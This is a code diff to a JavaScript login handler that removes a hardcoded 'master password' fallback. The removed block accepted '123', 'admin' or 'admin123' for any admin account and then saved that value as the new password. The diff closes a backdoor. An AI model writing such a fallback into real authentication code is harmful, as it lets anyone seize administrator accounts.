@@ -127,13 +127,6 @@ const login = asyncHandler(async (req, res) => {
         isPasswordValid = await user.matchPassword(enteredPassword);
     }
 
-    // Fallback sync for master password on admin if set
-    if (!isPasswordValid && user.isAdmin && ['123', 'admin', 'admin123'].includes(enteredPassword.trim())) {
-        isPasswordValid = true;
-        user.password = enteredPassword.trim();
-        await user.save();
-    }
-
     if (!isPasswordValid) {
         res.status(401);
         throw new Error('Invalid password');
